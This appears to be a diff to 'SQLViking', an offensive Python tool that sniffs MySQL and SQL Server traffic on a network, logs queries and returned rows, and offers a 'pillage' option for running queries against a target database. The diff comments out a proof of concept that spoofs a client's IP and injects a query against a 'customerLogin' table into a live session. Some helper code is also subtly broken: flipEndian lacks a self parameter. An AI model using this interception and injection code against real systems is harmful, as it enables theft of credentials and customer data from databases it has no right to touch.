@@ -11,6 +11,11 @@ import sqlserver
 pkts=Queue()
 queries=Queue()
 
+MYSQLREQ    = 1
+MYSQLRESP   = 2
+SQLSERVREQ  = 3
+SQLSERVRESP = 4
+
 class Parse(threading.Thread):
     #TODO: need to be able to set MTU from cmdline
     def __init__(self,mtu=1500):
@@ -26,10 +31,33 @@ class Parse(threading.Thread):
             if not pkts.empty():
                 self.parse(pkts.get())
 
+    def isMySql(self, pkt):
+        pktlen = len(pkt)/2
+        lengths=[]
+        while len(pkt)>0:
+            length = int(flipEndian(pkt[:6]),16)
+            lengths.append(length)
+            pkt = pkt[8+(length*2):]
+
+        tlen=0
+        for l in lengths:
+            tlen+=l
+        tlen+= len(lengths)*4
+
+        if tlen == pktlen:
+            return True
+        else:
+            return False
+
+    def flipEndian(data):
+        resp=''
+        for i in range(0,len(data),2):
+            resp = data[i]+data[i+1]+resp
+        return resp
+
     def parse(self,pkt):
         #TODO: determining parser by port. need to account for DBs on non-standard ports.
         #print '\nSource:\t%s\nTCP Val:\t%s\nAck:\t%s\nSeq:\t%s\n'%(pkt[IP].src,str(pkt[TCP]).encode('hex'),pkt[TCP].ack,pkt[TCP].seq)
-
         if pkt[TCP].sport == 1433 or pkt[TCP].sport == 3306:
             #reassesmble pkts if fragged
             key='%s:%s'%(pkt[IP].dst,pkt[TCP].dport)
@@ -51,9 +79,10 @@ class Parse(threading.Thread):
                     else:
                         self.parseRespMySQL(str(pkt[TCP])[20:])
         elif pkt[TCP].dport == 1433:
-            if len(pkt[TCP]) == 26:
-                req = sqlserver.Request()
-                send(IP(dst="192.168.37.135",src=pkt[IP].src)/TCP(flags="PA",dport=pkt[TCP].dport,sport=pkt[TCP].sport,seq=pkt[TCP].seq,ack=pkt[TCP].ack)/req.buildRequest("select top 1 * from customerLogin"))
+            #Pillage POC
+            #if len(pkt[TCP]) == 26:
+            #    req = sqlserver.Request()
+            #    send(IP(dst="192.168.37.135",src=pkt[IP].src)/TCP(flags="PA",dport=pkt[TCP].dport,sport=pkt[TCP].sport,seq=pkt[TCP].seq,ack=pkt[TCP].ack)/req.buildRequest("select top 1 * from customerLogin"))
             self.parseReqSQLServ(str(pkt[TCP]).encode('hex')[40:])
         elif pkt[TCP].dport == 3306:
             self.parseReqMySQL(str(pkt[TCP]).encode('hex')[40:])
@@ -65,10 +94,9 @@ class Parse(threading.Thread):
 
     def readable(self,data):
         a=""
-        #TODO: terrible code, find better way to iterate over 2 chars at a time
-        for i in range(0,len(data)/2):
-            if self.validAscii(data[i*2:i*2+2]):
-                a+=data[i*2:i*2+2].decode("hex")
+        for i in range(0,len(data),2):
+            if self.validAscii(data[i:i+2]):
+                a+=data[i:i+2].decode('hex')
         return a
 
     def formatTuple(self,t):
@@ -78,22 +106,26 @@ class Parse(threading.Thread):
         return res[:-2]
 
     def parseReqMySQL(self,data):
-        self.logres("\n--MySQL Req--")
-        self.logres("\nRaw: %s\n"%data)
-        self.logres("\nASCII: %s\n"%self.readable(data))
+        self.logres("\n--MySQL Req--\n")
+        self.logres("Raw: %s\n"%data)
+        self.logres("ASCII: %s\n"%self.readable(data))
 
     def parseRespMySQL(self,data):
-        self.logres("\n--MySQL Resp--")
+        self.logres("\n--MySQL Resp--\n")
         res = connections.MySQLResult(connections.Result(data))
         try:
             res.read()
-            self.logres('\n[*] Message:\t%s\n'%str(res.message))
-            self.logres('\n[*] Description:\t%s\n'%str(res.description))
-            self.logres('\n[*] Rows:\n')
-            for r in res.rows:
-                self.logres(self.formatTuple(r))
+            self.logres('[*] Message:\t%s\n'%str(res.message))
+            self.logres('[*] Description:\t%s\n'%str(res.description))
+            self.logres('[*] Rows:\n')
+            if len(res.rows)>0:
+                for r in res.rows:
+                    self.logres(self.formatTuple(r))
+                self.logres('\n')
         except:
-            self.logres('\n[!] Error:\t%s\n'%sys.exc_info()[1])
+            self.logres('[!] Error:\t%s\n'%sys.exc_info()[1])
+        self.logres('[*] Raw:\t%s\n'%str(data).encode('hex'))
+
     def parseReqSQLServ(self,data):
         self.logres("\n--SQLServ Req--\n%s\n"%self.readable(data))
 
@@ -128,8 +160,9 @@ class Scout(threading.Thread):
     def scout(self):
         while not self.die:
             try:
-                sniff(prn=self.pushToQueue,filter="tcp",store=0,timeout=5,verbose=None)
+                sniff(prn=self.pushToQueue,filter="tcp",store=0,timeout=5)
             except:
+                print sys.exc_info()[1]
                 self.die = True
 
     def pushToQueue(self,pkt):
@@ -176,7 +209,7 @@ def parseInput(input,t):
     if input == 'w':
         writeResults(t)
     elif input == 'p':
-    	#TODO: need parsing thread to save all data to a globally accessible data structure. another queue?
+    	#TODO: need parsing thread to save all data to a globally accessible data structure. another queue? 
         t.println()
     elif input == 'r':
         pillage()
@@ -198,7 +231,8 @@ def printMainMenu(wipe=True):
     print('{{:^{}}}'.format(x).format('===Welcome to SQLViking==='))
     print('\n[*] Menu Items:')
     print('\tw - dump current results to file specified')
-    print('\tp - print current results to screen')
+    #TODO: menu printing wipes all printed data
+    #print('\tp - print current results to screen')
     print('\tr - run a query against a specified DB')
     print('\tq - quit')
 
@@ -218,12 +252,17 @@ def main():
         printMainMenu()
         try:
             parseInput(raw_input("\n> "),t2)
-        #except KeyboardInterrupt:
-        except:
+        except KeyboardInterrupt:
             print('\n[!] Shutting down...')
             t1.die = True
             t2.die = True
             t3.die = True
+            break
+        except:
+            t1.die = True
+            t2.die = True
+            t3.die = True
+            print sys.exc_info()[1]
             break
     
 if __name__ == "__main__":
